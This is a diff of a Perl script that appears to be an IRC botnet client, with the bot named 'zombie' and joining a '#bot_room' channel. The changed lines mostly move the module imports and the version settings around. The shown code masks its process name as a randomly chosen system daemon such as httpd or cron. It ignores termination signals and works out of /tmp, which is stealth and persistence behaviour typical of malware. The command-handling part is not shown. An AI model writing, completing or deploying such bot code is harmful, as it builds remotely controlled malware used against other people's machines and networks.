@@ -1,4 +1,10 @@
 #!/usr/bin/perl
+use Socket;
+use IO::Socket;
+use IO::Socket::INET;
+use IO::Select;
+#use strict;
+use warnings;
  
 ######################################################################################################################
 ######################################################################################################################
@@ -42,24 +48,25 @@ my @rps = ("/usr/local/apache/bin/httpd",
            "/sbin/klogd -c 1 -x -x",
            "/usr/sbin/acpid",
            "/usr/sbin/cron");
+
 my $process = $rps[rand scalar @rps];
+my @rversion = ("Phl4nk");
 my $vers = $rversion[rand scalar @rversion];
+my @rircname = ("zombie");
 my $ircname = $rircname[rand scalar @rircname];
 chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
-$server = '127.0.0.1' unless $server;
+my $server = '127.0.0.1';
 my $port = '6667';
 my $linas_max='8';
 my $sleep='5';
 my $homedir = "/tmp";
+my $version = 'v.02';
 my @admins = ("admin");
 #my @hostauth = ("gov");
 my @channels = ("#bot_room");
-my @rversion = ("phl4nk");
-my @rircname = ("zombie");
-my $version = 'v.03';
 my $pacotes = 1;
- 
+
 #################################################################
 ##### [ Stop Editing if you dont know what are you doing. ] #####
 #################################################################
@@ -69,11 +76,6 @@ $SIG{'HUP'} = 'IGNORE';
 $SIG{'TERM'} = 'IGNORE';
 $SIG{'CHLD'} = 'IGNORE';
 $SIG{'PS'} = 'IGNORE';
- 
-use Socket;
-use IO::Socket;
-use IO::Socket::INET;
-use IO::Select;
  
 chdir("$homedir");
 $server="$ARGV[0]" if $ARGV[0];
